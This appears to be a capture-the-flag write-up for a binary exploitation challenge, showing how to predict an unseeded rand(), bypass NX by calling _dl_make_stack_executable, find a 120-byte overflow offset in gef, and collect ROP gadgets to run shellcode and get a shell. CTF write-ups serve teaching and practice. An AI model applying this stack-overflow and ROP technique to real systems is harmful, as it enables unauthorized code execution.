

## Guess the number

We could brute-force to guess the number, or since function ``get_random`` takes a number generated with unseed rand as return, so we could load ``libc`` and call ``rand`` to generate such a number.

```python
num = (libc.rand() % 100) + 1
```

## Make stack executable

```bash
checksec --file ./vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   ./vuln
```

Since the program is NX enabled, we can't simply execute code from stack. To inject and run shellcode we need to make the stack executable.

Run ``nm`` on the program, we found an interesting function ``_dl_make_stack_executable``, which allow us to set permission on stack.

```asm
...
0000000000480860 T _dl_make_stack_executable
...
```

Disassamble with ``radare2``.

```bash
$ r2 vuln
 -- Your problems are solved in an abandoned branch somewhere
 [0x00400a40]> pd $s
```

``_dl_make_stack_executable`` takes ``__libc_stack_end`` as parameter and call ``mprotect`` with parameter ``__stack_prot``. 

```asm
            ;-- _dl_make_stack_executable:
            0x00480860      488b3591a923.  mov rsi, qword [obj._dl_pagesize] ; [0x6bb1f8:8]=0x1000
            0x00480867      53             push rbx
            0x00480868      4889fb         mov rbx, rdi
            0x0048086b      488b17         mov rdx, qword [rdi]
            0x0048086e      4889f7         mov rdi, rsi
            0x00480871      48f7df         neg rdi
            0x00480874      4821d7         and rdi, rdx
            0x00480877      483b15329223.  cmp rdx, qword [obj.__libc_stack_end] ; [0x6b9ab0:8]=0
            0x0048087e      7520           jne 0x4808a0
            0x00480880      8b156a962300   mov edx, dword [obj.__stack_prot] ; [0x6b9ef0:4]=0x1000000
            0x00480886      e8f5abfcff     call sym.__mprotect
            0x0048088b      85c0           test eax, eax
            0x0048088d      7521           jne 0x4808b0
            0x0048088f      48c703000000.  mov qword [rbx], 0
            0x00480896      830d4ba92300.  or dword [obj._dl_stack_flags], 1 ; [0x6bb1e8:4]=7
            0x0048089d      5b             pop rbx
            0x0048089e      c3             ret
```

We need to set ``__stack_prot`` to *7*, meaning *PROT_READ|PROT_WRITE|PROT_EXEC*, and then call ``_dl_make_stack_executable`` with address of ``__libc_stack_end`` to make stack executable.

```c
#define PROT_READ  0x1    /* page can be read */
#define PROT_WRITE  0x2   /* page can be written */
#define PROT_EXEC 0x4     /* page can be executed */
```

So the payload would be ``padding + set __stack_prot to 7 + set rdi to __libc_stack_end + call _dl_make_stack_executable + push shellcode``.

## Find out padding

Set a breakpoint in main and run the program.

```bash
gef➤  break main
gef➤  r
```

Now try to call ``win`` with generated patter to cause segfault.

```bash
gef➤  pattern create 150                                                                                                                     [58/1898]
[+] Generating a pattern of 150 bytes                                                                                                                 
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaa
[+] Saved as '$_gef0'                                                      
gef➤  call (void*)win()                                                     
New winner!                                                                
Name? aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaa
saaaaa
Congrats aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaa
aaasaaaaa



Program received signal SIGSEGV, Segmentation fault.
0x0000000000400c8b in win ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xa2              
$rbx   : 0x00000000006ba580  →  0x00000000fbad2288
$rcx   : 0x0               
$rdx   : 0x00000000006bcdf0  →  0x0000000000000000
$rsp   : 0x00007fffffffdba8  →  0x6161616161616170 ("paaaaaaa"?)
$rbp   : 0x616161616161616f ("oaaaaaaa"?)
$rsi   : 0x0               
$rdi   : 0x1               
$rip   : 0x0000000000400c8b  →  <win+75> ret 
$r8    : 0x0               
$r9    : 0xa2           
$r10   : 0xffffff69                                                                                                                          [30/1898]
$r11   : 0x246             
$r12   : 0x00000000006bbce0  →  0x0000000000000000
$r13   : 0x00000000006bc0a0  →  0x0000000000000000
$r14   : 0x00000000006bc0a0  →  0x0000000000000000
$r15   : 0x167             
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdba8│+0x0000: 0x6161616161616170   ← $rsp
0x00007fffffffdbb0│+0x0008: 0x6161616161616171
0x00007fffffffdbb8│+0x0010: 0xcc61616161616172
0x00007fffffffdbc0│+0x0018: "saaaaa\n"
0x00007fffffffdbc8│+0x0020: 0x000000006037a800
0x00007fffffffdbd0│+0x0028: 0x0000000010d44792
0x00007fffffffdbd8│+0x0030: 0x000000000041446d  →  <_IO_new_file_write+45> test rax, rax
0x00007fffffffdbe0│+0x0038: 0x0000000010d44792
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x400c84 <win+68>         call   0x410010 <printf>
     0x400c89 <win+73>         nop    
     0x400c8a <win+74>         leave  
 →   0x400c8b <win+75>         ret    
[!] Cannot disassemble from $PC
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x400c8b in win (), reason: SIGSEGV
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x400c8b → win()
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
The program being debugged was signaled while in a function called from GDB.
GDB remains in the frame where the signal was received.                                                                                       [1/1898]
To change this behavior use "set unwindonsignal on".
Evaluation of the expression containing the function
(win) will be abandoned.
When the function is done executing, GDB will silently stop.
```

Check the registers, noticed the pattern in ``$rsp``. Search the pattern and find out padding is 120.

```bash
gef➤  registers 
$rax   : 0xa2              
$rbx   : 0x00000000006ba580  →  0x00000000fbad2288
$rcx   : 0x0               
$rdx   : 0x00000000006bcdf0  →  0x0000000000000000
$rsp   : 0x00007fffffffdba8  →  0x6161616161616170 ("paaaaaaa"?)
$rbp   : 0x616161616161616f ("oaaaaaaa"?)
$rsi   : 0x0               
$rdi   : 0x1               
$rip   : 0x0000000000400c8b  →  <win+75> ret 
$r8    : 0x0               
$r9    : 0xa2              
$r10   : 0xffffff69        
$r11   : 0x246             
$r12   : 0x00000000006bbce0  →  0x0000000000000000
$r13   : 0x00000000006bc0a0  →  0x0000000000000000
$r14   : 0x00000000006bc0a0  →  0x0000000000000000
$r15   : 0x167             
$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
gef➤  pattern search paaaaaaa
[+] Searching 'paaaaaaa'
[+] Found at offset 113 (little-endian search) likely
[+] Found at offset 120 (big-endian search) 
gef➤ 
```


## Find gadgets

Run ``ROPgadget`` to print all the gadges in ``vuln``.

```bash
ROPgadget --binary ./vuln
```

``ROP.find_gadget`` in ``pwntools`` is convinient, but some gadgets might be missing in gadget list, we could still manually add them.

```bash
...
0x0000000000419127 : mov qword ptr [rdx], rax ; ret
...
0x0000000000451974 : push rsp ; ret
...
```

Combine them all together to get shell and find the flag in ``flag.txt`` on remote server.

